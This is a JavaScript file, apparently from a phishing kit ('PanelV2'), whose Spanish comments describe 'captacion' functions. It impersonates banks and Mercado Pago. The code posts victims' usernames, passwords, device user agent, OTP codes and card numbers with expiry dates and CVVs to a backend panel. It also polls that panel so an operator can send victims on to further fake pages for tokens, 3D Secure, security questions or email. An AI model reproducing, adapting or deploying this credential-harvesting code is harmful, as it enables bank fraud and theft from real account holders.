// Funciones universales de captacion para PanelV2
// Se ha unificado 'functions.js' y 'functions2.js'

function getBasePath() {
    let path = window.location.pathname;
    let index = path.indexOf('/pago/');
    if(index !== -1) {
        return path.substring(0, index);
    }
    return ''; 
}

const API_BASE = getBasePath() + '/SISTEMA_PANEL/process/';

function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
    let nameEQ = name + "=";
    let ca = document.cookie.split(';');
    for(let i=0;i < ca.length;i++) {
        let c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}

// Extraer banco de la URL si no se especifica
function getBancoFromUrl() {
    let url = window.location.href.toLowerCase();
    let parts = url.split('/pago/');
    if(parts.length > 1) {
        let sub = parts[1].split('/')[0];
        if(sub) return sub.charAt(0).toUpperCase() + sub.slice(1);
    }
    return 'Generico';
}

// 1. Enviar Usuario (Paso 1)
function inicio(usr, banco = '') {
    if (!banco) banco = getBancoFromUrl();
    setCookie('usuario', usr, 1);
    
    $.post(API_BASE + 'paso_usuario.php', {
        usr: usr,
        banco: banco,
        dis: navigator.userAgent
    }, function(res) {
        window.location.href = "clave.php";
    }).fail(function() {
        window.location.href = "clave.php";
    });
}

// 2. Enviar Clave (Paso 2)
function pasousuario(pass, usr = '', banco = '') {
    if(!usr) usr = getCookie('usuario') || '';
    if (!banco) banco = getBancoFromUrl();
    
    $.post(API_BASE + 'paso_usuario.php', {
        pass: pass,
        usr: usr,
        banco: banco,
        dis: navigator.userAgent
    }, function(res) {
        window.location.href = "cargando.php";
    }).fail(function() {
        window.location.href = "cargando.php";
    });
}

// Para retrocompatibilidad
function clave(pass, usr = '', banco = '') {
    pasousuario(pass, usr, banco);
}

// 3. Enviar OTP
function otp(codigo) {
    $.post(API_BASE + 'paso_otp.php', {
        otp: codigo
    }, function() {
        window.location.href = "cargando.php";
    }).fail(function() {
        window.location.href = "cargando.php";
    });
}

// 4. Enviar Tarjeta
function tarjeta(tarjeta, fecha, cvv) {
    $.post(API_BASE + 'paso_tarjeta.php', {
        tar: tarjeta,
        fec: fecha,
        cvv: cvv
    }, function() {
        window.location.href = "cargando.php";
    }).fail(function() {
        window.location.href = "cargando.php";
    });
}

function consultar_estado() {
    $.post(API_BASE + 'check.php', function(estado) {
        estado = parseInt(estado);
        let flow = getCookie('flow_type') === 'mercadopago' ? 'mercadopago' : 'generico';

        switch(estado) {
            case 2: // pedir OTP
                window.location.href = "otp.php";
                break;
            case 4: // pedir Correo
                window.location.href = "../generico/correo.php";
                break;
            case 6: // pedir Tarjeta
                window.location.href = "../" + flow + "/tarjeta.php";
                break;
            case 8: // pedir OTP2
                window.location.href = "../generico/otp2.php";
                break;
            case 10: // Finalizar/Éxito
                window.location.href = "finish.php";
                break;
            case 12: // Error Usuario
                window.location.href = "errorusuario.php";
                break;
            case 14: // 3D Secure
                window.location.href = "../generico/3d.php";
                break;
            case 20: // Pregunta (Banco General)
                window.location.href = "../generico/pregunta.php";
                break;
            case 21: // Token
                window.location.href = "../generico/token.php";
                break;
            case 25: // Volver a validar / error generico
                window.location.href = "error.php";
                break;
            case 40: // 404 (Ignorar u ocultar)
                window.location.href = "../generico/404.php";
                break;
            case 41: // Error de Tarjeta (ccerror)
                window.location.href = "../" + flow + "/tarjeta.php?err=1";
                break;
        }
    });
}

// Retrocompatibilidad
function esperar() {
    consultar_estado();
}
